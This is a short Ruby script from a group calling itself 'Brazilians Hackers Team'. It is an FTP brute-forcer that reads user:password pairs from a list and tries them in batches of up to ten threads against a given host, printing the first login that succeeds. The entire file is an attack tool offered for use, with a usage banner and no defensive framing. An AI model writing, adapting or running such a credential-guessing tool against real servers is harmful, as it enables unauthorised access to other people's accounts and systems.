#!/usr/bin/env ruby
require 'net/ftp'
require 'thread'
############>>>>HEADER<<<<###############
puts "#{'#'*59}"
puts "#{'#'*1} *** Brazilians Hackers Team ***  #{' '*12}# #{' '*27}#"
puts "#{'#'*1} brazilobscure@live.com     # # >>>--- FTP Bruter ---<<< #"
puts "#{'#'*1} https://www.youtube.com/user/BrazilObscure # #{' '*27}#"
puts "#{'#'*59}"
############>>>>HEADER<<<<###############

############>>>> Usage<<<<###############
if (ARGV.size < 2)
	puts "Usage: ./ftp_bruter.rb [IP ADDR] [Password list]"
	puts "ex: ./ftp_bruter.rb 127.0.0.1 passwords.lst"
	exit
end
############>>>> Usage<<<<###############

host    = ARGV[0]
pwdlist = ARGV[1]
threads = []
i       = 0

puts " \n>>FTP_bruter running...\n\n"
File.open(pwdlist, "r").each_line do |line|
user, pass = line.split(":")
	if i < 10
	threads << Thread.new{
	begin
		Net::FTP.new(host).login(user, pass)
		puts "Login   : #{user} "
		puts "Password: #{pass} \n"
		puts ">>Exiting..."
		exit
	rescue
		Net::FTPPermError
	end#begin
	}
	i += 1
	else
		sleep(0.05) and threads.delete_if {|x| not x.alive?} while not threads.empty?
        	i = 0
	end#if
	threads.each {|thread| thread.join}
end#do